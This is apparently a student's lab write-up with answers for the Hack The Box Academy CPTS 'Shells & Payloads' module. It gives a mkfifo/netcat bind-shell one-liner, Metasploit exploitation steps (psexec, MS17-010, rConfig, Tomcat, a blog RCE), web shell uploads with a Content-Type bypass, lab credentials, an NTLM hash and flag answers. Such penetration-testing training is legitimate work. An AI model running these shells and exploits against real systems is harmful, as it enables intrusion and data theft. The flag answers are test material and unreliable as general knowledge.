---
title: CPTS labs - 07 Shell and payloads
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 07 Shell and payloads


## [Shells & Payloads](https://academy.hackthebox.com/module/details/115)

### Shell Basics

**Which two shell languages did we experiment with in this section? (Format: shellname&shellname)**

Results:  bash&powershell

 **In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.**
Results:  Core

**Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?**

Results:  443


**SSH to $ipVictim with user "htb-student" and password "HTB_@cademy_stdnt!". Create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.**

```
# Connect via ssh with victim's machine. In the attacker machine:
ssh htb-student@$ipVictim
# enter password. Now, in the same terminal set the listener:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $ipVictim $port > /tmp/f

# In the attacker terminal:
nc $ipVictim $port
cat /customscripts/flag.txt
```

Results:  B1nD_Shells_r_cool


**When establishing a reverse shell session with a target, will the target act as a client or server?**
Results:  Client

**Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.**

Results:  Shells-Win10


### Payloads

**What command language interpreter is used to establish a system shell session with the target?**

Results:  powershell

**Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)**

```
msfconsole -q
use exploit/windows/smb/psexec
show info
set RHOSTS ...
set LHOST ...
set SMBPass HTB_@cademy_stdnt!  
set SMBUser htb-student
set SMBSHARE ADMIN$
run

dir C:\Users\htb-student\Documents>
```

Results:  staffsalaries.txt

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::


### Windows Shells

**What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')**

Results:  .bat


**What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)**

Results:  MS17-010


 **Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\**

```
sudo nmap -sC -sV -O $ip -Pn
msfconsole -q

search MS17-010
use windows/smb/ms17_010_psexec
set RHOSTS...
set SHARE ADMIN$
set LHOST
run
```

Results:  EB-Still-W0rk$



### NIX Shells

**What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?**

Results:  php

 Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.

```
sudo nmap -sC -sV -v $ip -Pn

# Enter ip in the browser and discover rConfig Version 3.9.6 

msfconsole -q
search rConfig
use linux/http/rconfig_vendors_auth_file_upload_rce
set RHOSTS
set LHOST
run

ls -la /devicedetails
cat /devicedetails/hostnameinfo.txt
cat /devicedetails/edgerouter-isp.yml
```

Results:  edgerouter-isp
### Web Shells

#### laudanum
vHosts needed for these questions: `status.inlanefreight.local`
Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\path\you\land\in)

```shell-session
sudo nmap -sC -sV $ip

# Add "$ip status.inlanefreight.local" to /etc/hosts
# browse to status.inlanefreight.local
# Infer that aspx is in use.
# Notice the upload file feature by the end of the page

# Copy the file you want to use from laudanum repo to where you want to use it from:
cp /usr/share/laudanum/aspx/shell.aspx /your/path/laudanum.aspx
# In this case I'm selecting an aspx shell. There are other types.
```

Modify the shell to use. Add to the whitelisting rule your ip.

![laudanum](img/laudanum2.png)

Upload the file to the web server.

Once uploaded, go to http://status.inlanefreight.local//file/laudanum.aspx which is your uploaded file. You will see something like:

![laudanum](img/laudanum.png)


```
dir
```

Results:  c:\windows\system32\inetsrv


Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)

```
# Spawn Pwnbox and open a Parrot terminal
locate laudanum
```

Results:  /usr/share/laudanum/aspx/shell.aspx

#### antak webshell

**vHosts needed for these questions: `status.inlanefreight.local`. Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)**

```
# Spawn Pwnbox and open a Parrot terminal
locate antak
```

Results:  /usr/share/nishang/Antak-WebShell/antak.aspx


**Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: **\**, 1 space)**



```shell-session
# First step, generate the file you will upload:
sudo cp /usr/share/nishang/Antak-WebShell/antak.aspx /path/Upload.aspx
```

Set credentials for access to the web shell. Modify `line 14`, adding a user and password.

![antak](img/antak.png)

Open the browser and upload the file to the web app.  Open the url  //files/Upload.aspx and enter user and password.

![antak2](img/antak2.png)

Now that we have access, we can utilize PowerShell commands to navigate and take actions against the host.

```
whoami
```

Results:  iis apppool\status

#### php shells

**In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../...)**

Results:  image/gif


**Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)**

```
# Access the site and enter credentials admin:admin
# Go to devices > vendor 
# Intercept the uploading of the logo
# Use https://www.revshells.com/ -> PHP Ivan Sincek
# Modifify the file to contain attacker ip and port
# Upload it. Bypass content-type. Leave image/gif. Leave in the intercepted payload the PHP extensionin filename.
# Set a netcat listener
nc -lnvp 1234
# Trigger the uploaded file from https://$ip/images/vendor/nameOfUploadedFile.php
# You will get the reverse shell. List files
ls -la
```

Results:  ajax-loader.gif


### Skills Assessment

CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (`172.16.1.0/23` network) so you may want to pay careful attention to the IP address you pick when starting your listeners.

```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

10.129.213.83


**What is the hostname of Host-1? (Format: all lower case)**

```
# Connect to the parrot machine
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!

# Open a terminal and scan ip range 172.16.1.0/23
nmap 172.16.1.0/23

# Three host identified: .11, .12, and .13. Host-1 is .11. Perform a nmap scan on open ports:
sudo nmap -sC -sV 172.16.1.11 -p80,135,139,445,515,1801,2103,2105,2107,3389,8080

# The hostname is displayed
```

Results:  SHELLS-WINSVR



**Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)**

```
# The Parrot machine has on Desktop a file called access-creds.txt. It contains several useful creds, such as those of Tomcat service.
# One of the services listed in the nmap scanner in Apache Tomcat 10.0.11 running on 8080. We will exploit that one:
msfconsole -q
search tomcat
use multi/http/tomcat_mgr_upload
set RHOSTS 172.16.1.11
set RPORT 8080
set target Windows Universal
set payload payload/generic/shell_reverse_tcp 
# After gaining access, go to c:\Shares
dir
```

Results:   dev-share


**What distribution of Linux is running on Host-2? (Format: distro name, all lower case)**

```
nmap -A 172.16.1.12 -p22,80
```

Results:  Ubuntu


**What language is the shell written in that gets uploaded when using the 50064.rb exploit?**

Results:  php


**Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt**

```
# Open firefox writting in the terminal
firefox

# Open the blog in scope http://blog.inlinefreight.local and click on login
# Enter the creds from the access-creds.txt file: admin:admin123!@#
# The new interface allows you to upload certain contents. Open Burpsuite and intercept communications. Also, observe the content of the site. There is a link to https://www.exploit-db.com/exploits/50064 about Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)
# Open a terminal on the Parrot:
searchsploit Lightweight
# You will see 
Lightweight facebook-styled blog 1.3 - Remote | php/webapps/50064.rb

# Print the path
searchsploit -m php/webapps/50064.rb

# Create the folders
sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/
sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/

# Copy the exploit
sudo cp 50064.rb mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/

# Reload all modules
reload_all

# Now when searching for Lightweight, we could access the exploit
search Lightweight
use exploit/php/webapps/50064
options
set RHOSTS 172.16.1.12
set TARGETURI /
set VHOST blog.inlanefreight.local
set USERNAME admin
set PASSWORD admin123!@#
run
cat /customscripts/flag.txt
```

Results:  B1nD_Shells_r_cool


**What is the hostname of Host-3?**

```
sudo nmap -A 172.16.1.13 -p80,135,139,445
```

Results:  SHELLS-WINBLUE

**Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt**

```
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
SET RHOSTS 172.16.1.13
SET LHOST 172.16.1.5
run 
shell
type C:\Users\Administrator\Desktop\Skills-flag.txt
```

Results:  One-H0st-Down!

